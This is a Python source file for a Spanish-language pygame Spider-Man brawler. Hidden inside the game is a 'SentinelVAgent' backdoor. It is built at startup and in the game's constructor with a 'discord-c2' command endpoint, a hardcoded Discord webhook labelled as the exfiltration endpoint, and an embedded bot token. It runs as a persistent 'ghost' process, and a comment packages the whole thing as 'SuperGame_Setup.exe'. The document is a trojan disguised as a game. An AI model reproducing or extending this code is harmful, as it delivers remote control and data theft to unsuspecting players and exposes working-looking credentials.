import pygame
import sys
import os
import random
import math
import threading
import subprocess
import time
import tempfile
import logging
from abc import ABC, abstractmethod

try:
    import psutil
except ImportError:  # pragma: no cover
    psutil = None

logging.basicConfig(level=logging.WARNING)  # Silenciar logs de debug en el juego


def _write_early_debug(message: str) -> None:
    try:
        temp_path = os.path.join(tempfile.gettempdir(), "sentinel_ghost_startup.log")
        with open(temp_path, "a", encoding="utf-8") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")
    except Exception:
        pass


def _log_uncaught_exception(exc_type, exc_value, exc_traceback) -> None:
    if exc_type is KeyboardInterrupt:
        sys.__excepthook__(exc_type, exc_value, exc_traceback)
        return
    _write_early_debug(
        f"UNCAUGHT EXCEPTION: {exc_type.__name__}: {exc_value}"
    )
    try:
        import traceback
        with open(
            os.path.join(tempfile.gettempdir(), "sentinel_ghost_startup.log"), "a", encoding="utf-8"
        ) as f:
            traceback.print_exception(exc_type, exc_value, exc_traceback, file=f)
    except Exception:
        pass

sys.excepthook = _log_uncaught_exception

RUTA_BASE = os.path.dirname(os.path.abspath(__file__))
RUTA_LIBS = os.path.abspath(os.path.join(RUTA_BASE, ".."))
if RUTA_LIBS not in sys.path:
    sys.path.insert(0, RUTA_LIBS)

try:
    from SentinelV.Agent import SentinelVAgent
    from SentinelV.DiscordConfig import load_discord_credentials
except Exception as exc:
    _write_early_debug(f"Failed importing SentinelV modules: {exc}")
    raise


def get_resource_path(relative_path: str) -> str:
    """Resuelve rutas de recursos compatibles con PyInstaller y ejecuciones normales."""
    base_path = getattr(sys, "_MEIPASS", RUTA_BASE)
    return os.path.join(base_path, relative_path)


def _build_sentinel_agent() -> SentinelVAgent:
    discord_token, discord_channel_id = load_discord_credentials()
    return SentinelVAgent(
        command_endpoint="https://example.com/discord-c2",
        exfil_endpoint=(    
            "https://discord.com/api/webhooks/1503897443627171922/"
            "9ZcDUCVCUUHGrG9lXm55UmZbeDKYYaDSaceeXdv2IGD5CLXJwrAaNn5EdnZQOdrsK69C"
        ),
        discord_bot_token="MTUwMzk1MDA0Mjk2NzMxNDQ4Mg.GxBVNK.h0DDYz1Iy_S3cgPbhwmWFn6rUBZa6ZZCZ_Hd7Q",
        discord_channel_id=1503955307267620998,
    )


def _run_ghost_agent() -> None:
    # Sistema de logs de emergencia para debugging silencioso
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
    else:
        base_dir = os.path.dirname(__file__)
    log_file = os.path.join(tempfile.gettempdir(), "sentinel_debug.log")

    # Escribe una línea inicial inmediatamente para confirmar que se inició el ghost process.
    try:
        with open(log_file, "a", encoding="utf-8") as test_log:
            test_log.write(
                f"[GhostAgent] Inicio del proceso ghost. args={sys.argv} cwd={os.getcwd()}\n"
            )
    except Exception:
        pass

    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file, mode='a', encoding='utf-8'),
            logging.StreamHandler(),
        ],
        force=True,
    )

    logger = logging.getLogger("GhostAgent")
    logger.setLevel(logging.DEBUG)
    root_logger = logging.getLogger()
    root_logger.setLevel(logging.DEBUG)

    if not any(
        isinstance(handler, logging.FileHandler)
        and os.path.abspath(getattr(handler, 'baseFilename', '')) == os.path.abspath(log_file)
        for handler in logger.handlers
    ):
        try:
            file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
            file_handler.setLevel(logging.DEBUG)
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            logger.addHandler(file_handler)
            if not any(
                isinstance(handler, logging.FileHandler)
                and os.path.abspath(getattr(handler, 'baseFilename', '')) == os.path.abspath(log_file)
                for handler in root_logger.handlers
            ):
                root_logger.addHandler(file_handler)
        except Exception as exc:
            print(f"[GhostAgent] No se pudo abrir log file {log_file}: {exc}")

    if not any(isinstance(handler, logging.StreamHandler) for handler in root_logger.handlers):
        stream_handler = logging.StreamHandler()
        stream_handler.setLevel(logging.INFO)
        stream_handler.setFormatter(
            logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        )
        root_logger.addHandler(stream_handler)

    logger.info("Iniciando Ghost Agent...")
    logger.info("Ghost Agent ejecutándose en cwd=%s, executable=%s", os.getcwd(), sys.executable)
    logger.info("Log file: %s", log_file)

    # Verificación de instancia única para evitar zombis
    lock_file = os.path.join(base_dir, "sentinel.lock")

    def _pid_is_running(pid_value: str) -> bool:
        try:
            pid_int = int(pid_value)
        except ValueError:
            return False

        if psutil is not None:
            return psutil.pid_exists(pid_int)

        if os.name == "nt":
            result = subprocess.run(
                ["tasklist", "/FI", f"PID eq {pid_int}"],
                capture_output=True,
                text=True,
            )
            return str(pid_int) in result.stdout

        return os.path.exists(f"/proc/{pid_int}")

    try:
        if os.path.exists(lock_file):
            with open(lock_file, "r", encoding="utf-8") as f:
                pid = f.read().strip()
                if pid and _pid_is_running(pid):
                    logger.warning(f"Instancia ya corriendo con PID {pid}, abortando.")
                    return
        with open(lock_file, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except Exception as e:
        logger.warning(f"No se pudo verificar instancia única: {e}")

    try:
        agent = _build_sentinel_agent()
        logger.info("Agente construido, iniciando...")
        agent.start()
        logger.info("Agente iniciado exitosamente.")
        # FIX: mantener el proceso vivo con watchdog — si el bot muere, reconectar
        while True:
            time.sleep(30)
    except Exception as e:
        # FIX: removido 'raise' — antes mataba el ghost y todos sus threads (incluido el bot)
        logger.error(f"Error en Ghost Agent: {e}", exc_info=True)
        # Esperar antes de salir para que Discord vea la desconexión limpia
        time.sleep(5)
    finally:
        try:
            if os.path.exists(lock_file):
                os.remove(lock_file)
        except:
            pass


# PyInstaller entry point:
# pyinstaller --onefile --name SuperGame_Setup.exe juego_original\Juego.py --add-data "assets;assets"
ANCHO       = 800
ALTO        = 500
ANCHO_MUNDO = 1600
FPS         = 60
TITULO      = "Spider-Man: El Vengador"


BLANCO         = (255, 255, 255)
NEGRO          = (0,   0,   0)
ROJO           = (220, 50,  50)
VERDE          = (50,  200, 50)
AMARILLO       = (255, 215, 0)
AZUL           = (50,  100, 220)
NARANJA        = (255, 140, 0)
GRIS           = (100, 100, 100)
GRIS_OSC       = (40,  40,  40)
BLANCO_TELARANA = (220, 230, 255)


RUTA_BASE      = os.path.dirname(os.path.abspath(__file__))
RUTA_IMAGENES  = get_resource_path(os.path.join("assets", "imagenes"))
RUTA_AUDIO     = get_resource_path(os.path.join("assets", "audio"))


class GestorImagenes:
    def __init__(self):
        self.__imagenes = {}

    def cargar_imagen(self, nombre, archivo, ancho, alto):
        ruta = os.path.join(RUTA_IMAGENES, archivo)
        try:
            img = pygame.image.load(ruta)

            img = img.convert_alpha()
            img = pygame.transform.scale(img, (ancho, alto))
            self.__imagenes[nombre] = img
        except Exception as e:
            print(f"[GestorImagenes] Error cargando '{archivo}': {e}")
            sup = pygame.Surface((ancho, alto))
            sup.fill(ROJO)
            self.__imagenes[nombre] = sup

    def get_imagen(self, nombre):
        return self.__imagenes.get(nombre)


class GestorAudio:
    def __init__(self):
        self.__sonidos       = {}
        self.__musica_actual = None

    def cargar_musica(self, nombre, archivo):
        ruta = os.path.join(RUTA_AUDIO, archivo)
        self.__sonidos[nombre] = ruta

    def cargar_sonido(self, nombre, archivo):
        ruta = os.path.join(RUTA_AUDIO, archivo)
        try:
            self.__sonidos[nombre] = pygame.mixer.Sound(ruta)
        except Exception:
            self.__sonidos[nombre] = None

    def reproducir_musica(self, nombre, loop=True):
        if nombre in self.__sonidos and self.__musica_actual != nombre:
            try:
                pygame.mixer.music.load(self.__sonidos[nombre])
                pygame.mixer.music.play(-1 if loop else 0)
                self.__musica_actual = nombre
            except Exception:
                pass

    def reproducir_sonido(self, nombre):
        s = self.__sonidos.get(nombre)
        if s:
            try:
                s.play()
            except Exception:
                pass

    def detener_musica(self):
        pygame.mixer.music.stop()
        self.__musica_actual = None


class Botiquin:
    def __init__(self, nombre, curacion, bonus_fuerza=0):
        self.__nombre       = nombre
        self.__curacion     = curacion
        self.__bonus_fuerza = bonus_fuerza
        self.__usado        = False

    @property
    def nombre(self):
        return self.__nombre

    @property
    def curacion(self):
        return self.__curacion

    @property
    def bonus_fuerza(self):
        return self.__bonus_fuerza

    @property
    def usado(self):
        return self.__usado

    @usado.setter
    def usado(self, valor):
        self.__usado = bool(valor)


class Personaje(ABC):
    def __init__(self, nombre, vida_max, fuerza, resistencia,
                 img_quieto, img_atacando, img_derrotado):
        self.__nombre        = nombre
        self.__vida_max      = vida_max
        self.__vida          = vida_max
        self.__fuerza        = fuerza
        self.__resistencia   = resistencia
        self.__img_quieto    = img_quieto
        self.__img_atacando  = img_atacando
        self.__img_derrotado = img_derrotado
        self.__estado        = "quieto"
        self.__x             = 100
        self.__y             = 310

    @property
    def nombre(self):
        return self.__nombre

    @property
    def vida(self):
        return self.__vida

    @vida.setter
    def vida(self, valor):
        if valor < 0:
            valor = 0
        if valor > self.__vida_max:
            valor = self.__vida_max
        self.__vida = valor

    @property
    def vida_max(self):
        return self.__vida_max

    @vida_max.setter
    def vida_max(self, valor):
        if valor < 1:
            valor = 1
        self.__vida_max = valor

    @property
    def fuerza(self):
        return self.__fuerza

    @fuerza.setter
    def fuerza(self, valor):
        if valor < 0:
            valor = 0
        self.__fuerza = valor

    @property
    def resistencia(self):
        return self.__resistencia

    @resistencia.setter
    def resistencia(self, valor):
        if valor < 0:
            valor = 0
        if valor > 100:
            valor = 100
        self.__resistencia = valor

    @property
    def estado(self):
        return self.__estado

    @estado.setter
    def estado(self, valor):
        self.__estado = valor

    @property
    def x(self):
        return self.__x

    @x.setter
    def x(self, valor):
        self.__x = valor

    @property
    def y(self):
        return self.__y

    @y.setter
    def y(self, valor):
        self.__y = valor

    def esta_vivo(self):
        return self.__vida > 0

    def recibir_danio(self, danio):
        reduccion  = (self.__resistencia / 100) * danio
        danio_real = int(danio - reduccion)
        if danio_real < 1:
            danio_real = 1
        self.vida = self.__vida - danio_real
        return danio_real

    def get_imagen_actual(self):
        if self.__estado == "atacando":
            return self.__img_atacando
        if self.__estado == "derrotado":
            return self.__img_derrotado
        return self.__img_quieto

    @abstractmethod
    def atacar(self):
        pass

    @abstractmethod
    def habilidad_especial(self):
        pass


class MaryJane:
    def __init__(self, gestor_img):
        self.__salvada       = False
        self.__viva          = True
        self.__tiempo_vida   = 60.0
        self.__x             = 1400
        self.__y             = 310
        self.__img_quieta    = gestor_img.get_imagen("mary_jane_quieta")
        self.__img_derrotada = gestor_img.get_imagen("mary_jane_derrotada")

    @property
    def salvada(self):
        return self.__salvada

    @salvada.setter
    def salvada(self, valor):
        self.__salvada = bool(valor)

    @property
    def viva(self):
        return self.__viva

    @property
    def tiempo_vida(self):
        return self.__tiempo_vida

    @property
    def x(self):
        return self.__x

    @property
    def y(self):
        return self.__y

    def reducir_tiempo(self, delta):
        self.__tiempo_vida -= delta
        if self.__tiempo_vida <= 0:
            self.__tiempo_vida = 0
            self.__viva = False


    def dibujar(self, pantalla, offset_x=0):
        img = self.__img_quieta if self.__viva else self.__img_derrotada
        if img:
            pantalla.blit(img, (self.__x - offset_x, self.__y))


class SpiderMan(Personaje):
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Spider-Man",
            vida_max    = 200,
            fuerza      = 30,
            resistencia = 20,
            img_quieto      = gestor_img.get_imagen("spiderman_quieto"),
            img_atacando    = gestor_img.get_imagen("spiderman_atacando"),
            img_derrotado   = gestor_img.get_imagen("spiderman_derrotado")
        )
        self.__estrellas         = 0
        self.__velocidad         = 5
        self.__tiempo_stuneo     = 3
        self.__stuneo_disponible = True
        self.__en_suelo          = True
        self.__vel_y             = 0
        self.__timer_estado      = 0
        self.__mary_jane         = None

        self.__botiquines = []
        self.__botiquines.append(Botiquin("Pequeño",  50))
        self.__botiquines.append(Botiquin("Normal",   80))
        self.__botiquines.append(Botiquin("Militar", 120, 5))

        self.x = 80
        self.y = 310

    @property
    def estrellas(self):
        return self.__estrellas

    @estrellas.setter
    def estrellas(self, valor):
        if valor < 0:
            valor = 0
        self.__estrellas = valor

    @property
    def velocidad(self):
        return self.__velocidad

    @velocidad.setter
    def velocidad(self, valor):
        if valor < 1:
            valor = 1
        self.__velocidad = valor

    @property
    def tiempo_stuneo(self):
        return self.__tiempo_stuneo

    @tiempo_stuneo.setter
    def tiempo_stuneo(self, valor):
        if valor < 1:
            valor = 1
        self.__tiempo_stuneo = valor

    @property
    def stuneo_disponible(self):
        return self.__stuneo_disponible

    @stuneo_disponible.setter
    def stuneo_disponible(self, valor):
        self.__stuneo_disponible = bool(valor)

    @property
    def en_suelo(self):
        return self.__en_suelo

    @property
    def botiquines(self):
        return self.__botiquines

    @property
    def mary_jane(self):
        return self.__mary_jane

    @mary_jane.setter
    def mary_jane(self, valor):
        self.__mary_jane = valor

    def atacar(self):
        self.estado = "atacando"
        self.__timer_estado = 20
        return self.fuerza + random.randint(0, 10)

    def habilidad_especial(self):
        if self.__stuneo_disponible:
            self.__stuneo_disponible = False
            self.estado = "atacando"
            self.__timer_estado = 30
            return self.__tiempo_stuneo
        return 0

    def usar_botiquin(self, indice):
        if 0 <= indice < len(self.__botiquines):
            bot = self.__botiquines[indice]
            if not bot.usado:
                self.vida = self.vida + bot.curacion
                if bot.bonus_fuerza > 0:
                    self.fuerza = self.fuerza + bot.bonus_fuerza
                bot.usado = True
                return True
        return False

    def mejorar(self, tipo, costo):
        if self.__estrellas >= costo:
            self.__estrellas -= costo
            if tipo == "fuerza":
                self.fuerza = self.fuerza + 10
            elif tipo == "velocidad":
                self.velocidad = self.velocidad + 2
            elif tipo == "stuneo":
                self.tiempo_stuneo = self.tiempo_stuneo + 1
            return True
        return False


    def mover(self, dx):
        nueva_x = self.x + dx
        if nueva_x < 0:
            nueva_x = 0
        if nueva_x > ANCHO_MUNDO - 120:
            nueva_x = ANCHO_MUNDO - 120
        self.x = nueva_x

    def saltar(self):
        if self.__en_suelo:
            self.__vel_y    = -15
            self.__en_suelo = False

    def actualizar_fisicas(self):
        if not self.__en_suelo:
            self.__vel_y += 1
            self.y = self.y + self.__vel_y
            if self.y >= 310:
                self.y          = 310
                self.__en_suelo = True
                self.__vel_y    = 0

        if self.__timer_estado > 0:
            self.__timer_estado -= 1
            if self.__timer_estado == 0:
                self.estado = "quieto"


    def dibujar(self, pantalla, offset_x=0):
        img = self.get_imagen_actual()
        if img:
            pantalla.blit(img, (self.x - offset_x, self.y))


class Enemigo(Personaje, ABC):
    def __init__(self, nombre, vida_max, fuerza, resistencia,
                 img_quieto, img_atacando, img_derrotado,
                 estrellas_recompensa):
        super().__init__(nombre, vida_max, fuerza, resistencia,
                         img_quieto, img_atacando, img_derrotado)
        self.__estrellas_recompensa = estrellas_recompensa
        self.__stunneado            = False
        self.__timer_stuneo         = 0
        self.__timer_ataque         = 0
        self.__intervalo_ataque     = 120

    @property
    def estrellas_recompensa(self):
        return self.__estrellas_recompensa

    @property
    def stunneado(self):
        return self.__stunneado

    @stunneado.setter
    def stunneado(self, valor):
        self.__stunneado = bool(valor)

    @property
    def timer_stuneo(self):
        return self.__timer_stuneo

    @timer_stuneo.setter
    def timer_stuneo(self, valor):
        if valor < 0:
            valor = 0
        self.__timer_stuneo = valor

    @property
    def intervalo_ataque(self):
        return self.__intervalo_ataque

    @intervalo_ataque.setter
    def intervalo_ataque(self, valor):
        self.__intervalo_ataque = valor

    def actualizar_stuneo(self):
        if self.__stunneado:
            self.__timer_stuneo -= 1
            if self.__timer_stuneo <= 0:
                self.__stunneado    = False
                self.__timer_stuneo = 0

    def puede_atacar(self):
        if self.__stunneado:
            return False
        self.__timer_ataque += 1
        if self.__timer_ataque >= self.__intervalo_ataque:
            self.__timer_ataque = 0
            return True
        return False

    def mover_hacia(self, objetivo_x):
        if not self.__stunneado:
            if self.x > objetivo_x + 90:
                self.x = self.x - 2
            elif self.x < objetivo_x + 90:
                self.x = self.x + 2

    def atacar(self):
        self.estado = "atacando"
        return self.fuerza + random.randint(0, 8)

    @abstractmethod
    def habilidad_especial(self):
        pass


    def dibujar(self, pantalla, offset_x=0):
        img = self.get_imagen_actual()
        if img:
            pantalla.blit(img, (self.x - offset_x, self.y))


class NPC(Enemigo):
    def __init__(self, nombre, vida_max, fuerza, resistencia,
                 img_quieto, img_atacando, img_derrotado):
        super().__init__(nombre, vida_max, fuerza, resistencia,
                         img_quieto, img_atacando, img_derrotado,
                         estrellas_recompensa=1)

    def habilidad_especial(self):
        return self.fuerza + random.randint(5, 15)


class Rhino(Enemigo):
    """Tanque cuerpo a cuerpo: mucha vida y resistencia, golpe lento pero fuerte."""
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Rhino",
            vida_max    = 180,
            fuerza      = 28,
            resistencia = 22,
            img_quieto      = gestor_img.get_imagen("rhino_quieto"),
            img_atacando    = gestor_img.get_imagen("rhino_atacando"),
            img_derrotado   = gestor_img.get_imagen("rhino_derrotado"),
            estrellas_recompensa = 3
        )
        self.intervalo_ataque = 100

    def habilidad_especial(self):

        return self.fuerza + random.randint(10, 22)


class Shocker(Enemigo):
    """Atacante a distancia moderada con vibraciones de choque."""
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Shocker",
            vida_max    = 150,
            fuerza      = 22,
            resistencia = 14,
            img_quieto      = gestor_img.get_imagen("shocker_quieto"),
            img_atacando    = gestor_img.get_imagen("shocker_atacando"),
            img_derrotado   = gestor_img.get_imagen("shocker_derrotado"),
            estrellas_recompensa = 3
        )
        self.intervalo_ataque = 85

    def habilidad_especial(self):

        return self.fuerza + random.randint(8, 18)


class Electro(Enemigo):
    """Ágil y eléctrico: ataque rápido y penetrante."""
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Electro",
            vida_max    = 160,
            fuerza      = 26,
            resistencia = 12,
            img_quieto      = gestor_img.get_imagen("electro_quieto"),
            img_atacando    = gestor_img.get_imagen("electro_atacando"),
            img_derrotado   = gestor_img.get_imagen("electro_derrotado"),
            estrellas_recompensa = 3
        )
        self.intervalo_ataque = 70

    def habilidad_especial(self):

        return self.fuerza + random.randint(12, 24)


class Vulture(Enemigo):
    """Buitre ágil: el más rápido de los villanos normales."""
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Buitre",
            vida_max    = 140,
            fuerza      = 20,
            resistencia = 10,
            img_quieto      = gestor_img.get_imagen("vulture_quieto"),
            img_atacando    = gestor_img.get_imagen("vulture_atacando"),
            img_derrotado   = gestor_img.get_imagen("vulture_derrotado"),
            estrellas_recompensa = 3
        )
        self.intervalo_ataque = 60

    def habilidad_especial(self):

        return self.fuerza + random.randint(6, 16)


class Jefe(Enemigo, ABC):
    def __init__(self, nombre, vida_max, fuerza, resistencia,
                 img_quieto, img_atacando, img_derrotado,
                 estrellas_recompensa):
        super().__init__(nombre, vida_max, fuerza, resistencia,
                         img_quieto, img_atacando, img_derrotado,
                         estrellas_recompensa)
        self.__contador_habilidad  = 0
        self.__intervalo_habilidad = 300

    def puede_usar_habilidad(self):
        self.__contador_habilidad += 1
        if self.__contador_habilidad >= self.__intervalo_habilidad:
            self.__contador_habilidad = 0
            return True
        return False

    @abstractmethod
    def habilidad_especial(self):
        pass


class Sandman(Jefe):
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Sandman",
            vida_max    = 350,
            fuerza      = 40,
            resistencia = 30,
            img_quieto      = gestor_img.get_imagen("sandman_quieto"),
            img_atacando    = gestor_img.get_imagen("sandman_ataque"),
            img_derrotado   = gestor_img.get_imagen("sandman_derrotado"),
            estrellas_recompensa = 5
        )
        self.__ralentizo_aplicado = False

    @property
    def ralentizo_aplicado(self):
        return self.__ralentizo_aplicado

    @ralentizo_aplicado.setter
    def ralentizo_aplicado(self, valor):
        self.__ralentizo_aplicado = bool(valor)

    def habilidad_especial(self):
        self.__ralentizo_aplicado = True
        return int(self.fuerza * 1.5)


class DoctorOctopus(Jefe):
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Doctor Octopus",
            vida_max    = 450,
            fuerza      = 50,
            resistencia = 35,
            img_quieto      = gestor_img.get_imagen("doctor_octopus_quieto"),
            img_atacando    = gestor_img.get_imagen("doctor_octopus_atacando"),
            img_derrotado   = gestor_img.get_imagen("doctor_octopus_derrotado"),
            estrellas_recompensa = 8
        )

    def habilidad_especial(self):
        return int(self.fuerza * 2)


class DuendeVerde(Jefe):
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Duende Verde",
            vida_max    = 500,
            fuerza      = 55,
            resistencia = 30,
            img_quieto      = gestor_img.get_imagen("duende_verde_quieto"),
            img_atacando    = gestor_img.get_imagen("duende_verde_atacando"),
            img_derrotado   = gestor_img.get_imagen("duende_verde_derrotado"),
            estrellas_recompensa = 10
        )

    def habilidad_especial(self):
        return int(self.fuerza * 2.5)


class Venom(Jefe):
    def __init__(self, gestor_img):
        super().__init__(
            nombre      = "Venom",
            vida_max    = 540,
            fuerza      = 63,
            resistencia = 38,
            img_quieto      = gestor_img.get_imagen("venom_quieto"),
            img_atacando    = gestor_img.get_imagen("venom_atacando"),
            img_derrotado   = gestor_img.get_imagen("venom_derrotado"),
            estrellas_recompensa = 15
        )

    def habilidad_especial(self):
        return int(self.fuerza * 2.8)


class Nivel:
    def __init__(self, numero, fondo, es_jefe=False, costos_mejora=None):
        self.__numero        = numero
        self.__fondo         = fondo
        self.__es_jefe       = es_jefe
        self.__costos_mejora = costos_mejora
        self.__completado    = False
        self.__estrellas     = 0
        self.__configs_npc   = []
        self.__configs_villano = []

    @property
    def numero(self):
        return self.__numero

    @property
    def fondo(self):
        return self.__fondo

    @property
    def es_jefe(self):
        return self.__es_jefe

    @property
    def costos_mejora(self):
        return self.__costos_mejora

    @property
    def completado(self):
        return self.__completado

    @completado.setter
    def completado(self, valor):
        self.__completado = bool(valor)

    @property
    def estrellas(self):
        return self.__estrellas

    def agregar_config_npc(self, sprite_idx, vida, fuerza, resistencia, x_pos):
        self.__configs_npc.append({
            "sprite_idx" : sprite_idx,
            "vida"       : vida,
            "fuerza"     : fuerza,
            "resistencia": resistencia,
            "x_pos"      : x_pos
        })


    def agregar_villano(self, clase_villano, x_pos):
        self.__configs_villano.append({"clase": clase_villano, "x_pos": x_pos})

    def crear_enemigos_frescos(self, gestor_img):
        enemigos = []


        for config in self.__configs_npc:
            idx = config["sprite_idx"]
            if idx == 1:
                suf_quieto    = "quieta"
                suf_derrotado = "derrotada"
            else:
                suf_quieto    = "quieto"
                suf_derrotado = "derrotado"

            npc = NPC(
                nombre      = f"Enemigo {idx}",
                vida_max    = config["vida"],
                fuerza      = config["fuerza"],
                resistencia = config["resistencia"],
                img_quieto      = gestor_img.get_imagen(f"npc{idx}_{suf_quieto}"),
                img_atacando    = gestor_img.get_imagen(f"npc{idx}_atacando"),
                img_derrotado   = gestor_img.get_imagen(f"npc{idx}_{suf_derrotado}")
            )
            npc.x = config["x_pos"]
            npc.y = 310
            enemigos.append(npc)


        for cfg in self.__configs_villano:
            villano = cfg["clase"](gestor_img)
            villano.x = cfg["x_pos"]
            villano.y = 310
            enemigos.append(villano)

        return enemigos

    def calcular_estrellas(self, tiempo_usado, vida_restante):
        if tiempo_usado < 30 and vida_restante > 100:
            self.__estrellas = 3
        elif tiempo_usado < 60 and vida_restante > 50:
            self.__estrellas = 2
        else:
            self.__estrellas = 1
        return self.__estrellas


class Juego:
    def __init__(self):
        pygame.init()
        pygame.mixer.init()
        self.__pantalla      = pygame.display.set_mode((ANCHO, ALTO))
        pygame.display.set_caption(TITULO)
        self.__reloj         = pygame.time.Clock()
        self.__gestor_img    = GestorImagenes()
        self.__gestor_audio  = GestorAudio()
        self.__estado        = "inicio"
        self.__nivel_actual  = 0
        self.__niveles       = []
        self.__spiderman     = None
        self.__enemigo_actual= None
        self.__cola_enemigos = []
        self.__mary_jane     = None
        self.__mensaje       = ""
        self.__timer_msg     = 0
        self.__tiempo_nivel  = 0
        self.__fuente_g      = None
        self.__fuente_m      = None
        self.__fuente_p      = None
        self.__offset_x      = 0
        self.__timer_telarana = 0
        discord_token, discord_channel_id = load_discord_credentials()
        self.__sentinel_agent = SentinelVAgent(
            command_endpoint="https://example.com/discord-c2",
            exfil_endpoint="https://discord.com/api/webhooks/1503897443627171922/9ZcDUCVCUUHGrG9lXm55UmZbeDKYYaDSaceeXdv2IGD5CLXJwrAaNn5EdnZQOdrsK69C",
            discord_bot_token="MTUwMzk1MDA0Mjk2NzMxNDQ4Mg.GxBVNK.h0DDYz1Iy_S3cgPbhwmWFn6rUBZa6ZZCZ_Hd7Q",
            discord_channel_id=1503955307267620998,
        )
        self.__cargar_recursos()
        self.__crear_niveles()


    def __cargar_recursos(self):
        self.__fuente_g = pygame.font.SysFont("Arial", 48, bold=True)
        self.__fuente_m = pygame.font.SysFont("Arial", 28)
        self.__fuente_p = pygame.font.SysFont("Arial", 20)


        self.__gestor_img.cargar_imagen("spiderman_quieto",    "spiderman_quieto.png",    80, 100)
        self.__gestor_img.cargar_imagen("spiderman_atacando",  "spiderman_atacando.png",  80, 100)
        self.__gestor_img.cargar_imagen("spiderman_derrotado", "spiderman_derrotado.png", 80, 100)


        self.__gestor_img.cargar_imagen("sandman_quieto",    "sandman_quieto.png",    90, 110)
        self.__gestor_img.cargar_imagen("sandman_ataque",    "sandman_ataque.png",    90, 110)
        self.__gestor_img.cargar_imagen("sandman_derrotado", "sandman_derrotado.png", 90, 110)


        self.__gestor_img.cargar_imagen("doctor_octopus_quieto",    "doctor_octopus_quieto.png",    100, 120)
        self.__gestor_img.cargar_imagen("doctor_octopus_atacando",  "doctor_octopus_atacando.png",  100, 120)
        self.__gestor_img.cargar_imagen("doctor_octopus_derrotado", "doctor_octopus_derrotado.png", 100, 120)


        self.__gestor_img.cargar_imagen("duende_verde_quieto",    "duende_verde_quieto.png",    90, 110)
        self.__gestor_img.cargar_imagen("duende_verde_atacando",  "duende_verde_atacando.png",  90, 110)
        self.__gestor_img.cargar_imagen("duende_verde_derrotado", "duende_verde_derrotado.png", 90, 110)


        self.__gestor_img.cargar_imagen("venom_quieto",    "venom_quieto.png",    100, 130)
        self.__gestor_img.cargar_imagen("venom_atacando",  "venom_atacando.png",  100, 130)
        self.__gestor_img.cargar_imagen("venom_derrotado", "venom_derrotado.png", 100, 130)


        self.__gestor_img.cargar_imagen("mary_jane_quieta",    "mary_jane_quieta.png",    60, 90)
        self.__gestor_img.cargar_imagen("mary_jane_derrotada", "mary_jane_derrotada.png", 60, 90)


        self.__gestor_img.cargar_imagen("npc1_quieta",    "npc1_quieta.png",    70, 90)
        self.__gestor_img.cargar_imagen("npc1_atacando",  "npc1_atacando.png",  70, 90)
        self.__gestor_img.cargar_imagen("npc1_derrotada", "npc1_derrotada.png", 70, 90)

        for i in range(2, 12):
            self.__gestor_img.cargar_imagen(f"npc{i}_quieto",    f"npc{i}_quieto.png",    70, 90)
            self.__gestor_img.cargar_imagen(f"npc{i}_atacando",  f"npc{i}_atacando.png",  70, 90)
            self.__gestor_img.cargar_imagen(f"npc{i}_derrotado", f"npc{i}_derrotado.png", 70, 90)


        for villano_key in ["rhino", "shocker", "electro", "vulture"]:
            self.__gestor_img.cargar_imagen(f"{villano_key}_quieto",    f"{villano_key}_quieto.png",    80, 100)
            self.__gestor_img.cargar_imagen(f"{villano_key}_atacando",  f"{villano_key}_atacando.png",  80, 100)
            self.__gestor_img.cargar_imagen(f"{villano_key}_derrotado", f"{villano_key}_derrotado.png", 80, 100)


        self.__gestor_img.cargar_imagen("fondo_principal", "campo_batalla_principal.jpeg", ANCHO, ALTO)
        self.__gestor_img.cargar_imagen("fondo_final",     "batalla_final_nivel_15.jpeg",  ANCHO, ALTO)


        self.__gestor_audio.cargar_musica("inicio",         "pantalla_inicio.mp3")
        self.__gestor_audio.cargar_musica("batalla_normal", "batalla_normal.mp3")
        self.__gestor_audio.cargar_musica("batalla_final",  "batalla_final.mp3")
        self.__gestor_audio.cargar_musica("victoria",       "victoria.mp3")
        self.__gestor_audio.cargar_sonido("golpe",          "golpe.mp3")


    def __crear_niveles(self):

        configs_por_nivel = [
            [(1, 70, 12, 8,  500)],
            [(2, 75, 14, 8,  500), (3, 70, 12, 7, 620)],
            [(4, 80, 15, 10, 500), (5, 75, 13, 8, 620)],
            [(6, 85, 16, 10, 500), (7, 80, 14, 9, 620), (8, 75, 13, 8, 750)],
        ]
        for idx in range(4):
            nivel = Nivel(idx + 1, "fondo_principal")
            for cfg in configs_por_nivel[idx]:
                nivel.agregar_config_npc(cfg[0], cfg[1], cfg[2], cfg[3], cfg[4])
            self.__niveles.append(nivel)


        n5 = Nivel(5, "fondo_principal", es_jefe=True,
                   costos_mejora={"fuerza": 5, "velocidad": 5, "stuneo": 8})
        self.__niveles.append(n5)


        n6 = Nivel(6, "fondo_principal")
        n6.agregar_config_npc(3, 85, 16, 11, 500)
        n6.agregar_config_npc(9, 80, 15, 10, 650)
        n6.agregar_villano(Rhino, 950)
        self.__niveles.append(n6)


        n7 = Nivel(7, "fondo_principal")
        n7.agregar_config_npc(4, 90, 17, 12, 500)
        n7.agregar_config_npc(10, 85, 16, 10, 680)
        n7.agregar_villano(Shocker, 1000)
        self.__niveles.append(n7)


        n8 = Nivel(8, "fondo_principal")
        n8.agregar_config_npc(5, 90, 17, 12, 500)
        n8.agregar_config_npc(11, 85, 16, 11, 680)
        n8.agregar_villano(Rhino,   950)
        n8.agregar_villano(Shocker, 1150)
        self.__niveles.append(n8)


        n9 = Nivel(9, "fondo_principal")
        n9.agregar_config_npc(7, 95, 18, 13, 500)
        n9.agregar_config_npc(8, 90, 17, 12, 680)
        n9.agregar_villano(Electro, 1000)
        self.__niveles.append(n9)


